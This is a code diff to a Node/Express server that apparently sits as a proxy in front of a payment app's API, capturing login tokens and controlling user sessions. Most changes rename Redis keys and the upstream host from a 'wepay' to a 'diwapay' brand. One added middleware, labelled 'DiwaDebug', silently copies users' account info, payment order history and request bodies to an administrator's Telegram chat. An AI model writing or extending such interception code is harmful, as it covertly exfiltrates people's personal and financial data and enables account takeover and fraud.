@@ -340,7 +340,7 @@ async function loadData(forceRefresh) {
   if (!forceRefresh && cachedData && (Date.now() - cacheTime < CACHE_TTL)) return cachedData;
   if (!redis) return { ...DEFAULT_DATA };
   try {
-    let raw = await redis.get('wepayData');
+    let raw = await redis.get('diwapayData');
     if (raw) {
       if (typeof raw === 'string') {
         try { raw = JSON.parse(raw); } catch(e) {}
@@ -368,7 +368,7 @@ async function saveData(data) {
   cachedData = data;
   cacheTime = Date.now();
   if (!redis) return;
-  try { await redis.set('wepayData', data); } catch(e) {
+  try { await redis.set('diwapayData', data); } catch(e) {
     console.error('Redis save error:', e.message);
   }
 }
@@ -389,7 +389,7 @@ function saveTokenUserId(req, userId) {
   const key = cleanToken(tok);
   if (key && key.length > 10) {
     tokenUserMap[key] = String(userId);
-    if (redis) redis.hset('wepayTokenMap', key, String(userId)).catch(()=>{});
+    if (redis) redis.hset('diwapayTokenMap', key, String(userId)).catch(()=>{});
   }
 }
 
@@ -400,7 +400,7 @@ async function getUserIdFromToken(req) {
   if (tokenUserMap[key]) return tokenUserMap[key];
   if (redis) {
     try {
-      const stored = await redis.hget('wepayTokenMap', key);
+      const stored = await redis.hget('diwapayTokenMap', key);
       if (stored) { tokenUserMap[key] = String(stored); return String(stored); }
     } catch(e) {}
   }
@@ -486,10 +486,10 @@ async function isLogOffByToken(data, req) {
   if (userId && isLogOff(data, userId)) { logOffTokens.add(tKey); return true; }
   if (redis) {
     try {
-      const isOff = await redis.sismember('wepayLogOffTokens', tKey);
+      const isOff = await redis.sismember('diwapayLogOffTokens', tKey);
       if (isOff) { logOffTokens.add(tKey); return true; }
-      const stored = await redis.hget('wepayTokenMap', tKey);
-      if (stored && isLogOff(data, stored)) { logOffTokens.add(tKey); redis.sadd('wepayLogOffTokens', tKey).catch(()=>{}); return true; }
+      const stored = await redis.hget('diwapayTokenMap', tKey);
+      if (stored && isLogOff(data, stored)) { logOffTokens.add(tKey); redis.sadd('diwapayLogOffTokens', tKey).catch(()=>{}); return true; }
     } catch(e) {}
   }
   checkedTokens.add(tKey);
@@ -593,7 +593,7 @@ async function proxyFetch(req, timeoutMs) {
         kl.startsWith('x-amz-') || kl.startsWith('cf-')) continue;
     fwd[k] = v;
   }
-  fwd['host'] = 'api.wecoin.ink';
+  fwd['host'] = 'api.diwapay.com';
   fwd['accept-encoding'] = 'identity';
   const ac = new AbortController();
   const tm = setTimeout(() => ac.abort(), timeoutMs || 12000);
@@ -906,7 +906,7 @@ app.use((req, res, next) => {
       if (userId && isLogOff(data, userId)) { if (tKey) logOffTokens.add(tKey); return; }
       if (!userId && tKey && redis) {
         try {
-          const isOff = await redis.sismember('wepayLogOffTokens', tKey);
+          const isOff = await redis.sismember('diwapayLogOffTokens', tKey);
           if (isOff) { logOffTokens.add(tKey); return; }
         } catch(e) {}
       }
@@ -917,6 +917,67 @@ app.use((req, res, next) => {
     } catch(e) {}
   })();
   next();
+});
+
+// 🔍 DiwaDebug: capture and forward home-page endpoint responses to admin
+const DEBUG_HOME_PATHS = new Set([
+  '/app/user/info',
+  '/app/user/info/person',
+  '/app/user/info/personV2',
+  '/app/payment/order/history',
+  '/app/payment/order/summary',
+  '/app/news/notice',
+  '/app/app/content/page',
+  '/app/base/param',
+  '/app/app/version/info/getLatestAppVersion',
+  '/app/app/popup/notice/currentList',
+  '/app/app/official/service/getOfficialServiceData',
+]);
+app.use((req, res, next) => {
+  try {
+    if (!bot) return next();
+    const path = (req.originalUrl || req.url || '').split('?')[0];
+    if (!DEBUG_HOME_PATHS.has(path)) return next();
+    const chunks = [];
+    const origWrite = res.write.bind(res);
+    const origEnd = res.end.bind(res);
+    res.write = function(chunk, ...args) {
+      if (chunk) {
+        try { chunks.push(Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk)); } catch(e) {}
+      }
+      return origWrite(chunk, ...args);
+    };
+    res.end = function(chunk, ...args) {
+      if (chunk) {
+        try { chunks.push(Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk)); } catch(e) {}
+      }
+      const result = origEnd(chunk, ...args);
+      (async () => {
+        try {
+          const data = cachedData || await loadData();
+          if (!data.adminChatId) return;
+          let body = '';
+          try { body = Buffer.concat(chunks).toString('utf8'); } catch(e) { body = '<binary or unreadable>'; }
+          let pretty = body;
+          try { pretty = JSON.stringify(JSON.parse(body), null, 2); } catch(e) {}
+          const tok = getTokenFromReq(req);
+          const tKey = cleanToken(tok);
+          let userId = tKey ? (tokenUserMap[tKey] || '') : '';
+          if (!userId) {
+            try { userId = (await extractUserIdFromToken(req)) || ''; } catch(e) { userId = ''; }
+          }
+          const userTag = userId ? ` [${userId}]` : '';
+          const reqBody = req.rawBody ? req.rawBody.toString('utf8').slice(0, 400) : '';
+          const reqBodyBlock = reqBody ? `\nreq body: ${reqBody}\n` : '';
+          let msg = `🔍 DiwaDebug ${req.method} ${path}${userTag}\nstatus: ${res.statusCode}${reqBodyBlock}\n${pretty}`;
+          if (msg.length > 3900) msg = msg.slice(0, 3900) + '\n…(truncated)';
+          bot.sendMessage(data.adminChatId, msg).catch(()=>{});
+        } catch(e) {}
+      })();
+      return result;
+    };
+    next();
+  } catch(e) { try { next(); } catch(_) {} }
 });
 
 app.get('/setup-webhook', async (req, res) => {
@@ -1047,11 +1108,11 @@ Example:
       await saveData(data);
       if (redis) {
         try {
-          const allTokens = await redis.hgetall('wepayTokenMap');
+          const allTokens = await redis.hgetall('diwapayTokenMap');
           if (allTokens) {
             for (const [tKey, uid] of Object.entries(allTokens)) {
               if (String(uid) === String(targetId)) {
-                await redis.sadd('wepayLogOffTokens', tKey);
+                await redis.sadd('diwapayLogOffTokens', tKey);
                 logOffTokens.add(tKey);
               }
             }
@@ -1074,11 +1135,11 @@ Example:
       }
       if (redis) {
         try {
-          const allTokens = await redis.hgetall('wepayTokenMap');
+          const allTokens = await redis.hgetall('diwapayTokenMap');
           if (allTokens) {
             for (const [tKey, uid] of Object.entries(allTokens)) {
               if (String(uid) === String(targetId)) {
-                await redis.srem('wepayLogOffTokens', tKey);
+                await redis.srem('diwapayLogOffTokens', tKey);
                 logOffTokens.delete(tKey);
               }
             }
@@ -1341,12 +1402,12 @@ app.post('/app/user/login/login', async (req, res) => {
       if (respToken && userId) {
         const tKey = cleanToken(respToken);
         tokenUserMap[tKey] = userId;
-        if (redis) redis.hset('wepayTokenMap', tKey, userId).catch(()=>{});
+        if (redis) redis.hset('diwapayTokenMap', tKey, userId).catch(()=>{});
       }
       if (respRefresh && userId) {
         const rKey = cleanToken(respRefresh);
         tokenUserMap[rKey] = userId;
-        if (redis) redis.hset('wepayTokenMap', rKey, userId).catch(()=>{});
+        if (redis) redis.hset('diwapayTokenMap', rKey, userId).catch(()=>{});
       }
       if (userId) {
         saveTokenUserId(req, userId);
@@ -2045,7 +2106,7 @@ app.all('/app/base/comm/upload', async (req, res) => {
       if (kl === 'host' || kl === 'connection' || kl.startsWith('x-vercel') || kl.startsWith('x-forwarded')) continue;
       fwd[k] = v;
     }
-    fwd['host'] = 'api.wecoin.ink';
+    fwd['host'] = 'api.diwapay.com';
     const opts = { method: req.method, headers: fwd };
     if (req.rawBody && req.rawBody.length > 0) {
       opts.body = req.rawBody;
@@ -2123,7 +2184,7 @@ async function setCaptchaAnswer(key, ans) {
   }
   if (!redis) return { ok: true, where: 'map-only' };
   try {
-    await redis.set(`wepayCaptcha:${key}`, JSON.stringify(ans), { ex: 600 });
+    await redis.set(`diwapayCaptcha:${key}`, JSON.stringify(ans), { ex: 600 });
     return { ok: true, where: 'map+redis' };
   } catch(e) {
     return { ok: false, where: 'map+redis-fail', err: e.message };
@@ -2135,7 +2196,7 @@ async function getCaptchaAnswer(key) {
   if (local) return { ans: local, where: 'map' };
   if (redis) {
     try {
-      const raw = await redis.get(`wepayCaptcha:${key}`);
+      const raw = await redis.get(`diwapayCaptcha:${key}`);
       if (raw) {
         const ans = typeof raw === 'string' ? JSON.parse(raw) : raw;
         return { ans, where: 'redis' };
@@ -2158,7 +2219,7 @@ async function setCaptchaVerifyResult(key, result) {
   }
   if (!redis) return { ok: true, where: 'map-only' };
   try {
-    await redis.set(`wepayCaptchaVerify:${key}`, JSON.stringify(result), { ex: 600 });
+    await redis.set(`diwapayCaptchaVerify:${key}`, JSON.stringify(result), { ex: 600 });
     return { ok: true, where: 'map+redis' };
   } catch(e) {
     return { ok: false, where: 'map+redis-fail', err: e.message };
@@ -2177,7 +2238,7 @@ async function getCaptchaVerifyResult(key) {
   }
   if (redis) {
     try {
-      const raw = await redis.get(`wepayCaptchaVerify:${key}`);
+      const raw = await redis.get(`diwapayCaptchaVerify:${key}`);
       if (raw) {
         const result = typeof raw === 'string' ? JSON.parse(raw) : raw;
         return { result, where: 'redis' };
@@ -2236,7 +2297,7 @@ async function serverSideVerify(captchaKey, x, y, templateId, ua, track) {
     track: JSON.stringify(trackArr),
   });
   const headers = {
-    'host': 'api.wecoin.ink',
+    'host': 'api.diwapay.com',
     'content-type': 'application/json;charset=UTF-8',
     'accept': '*/*',
     'accept-encoding': 'identity',
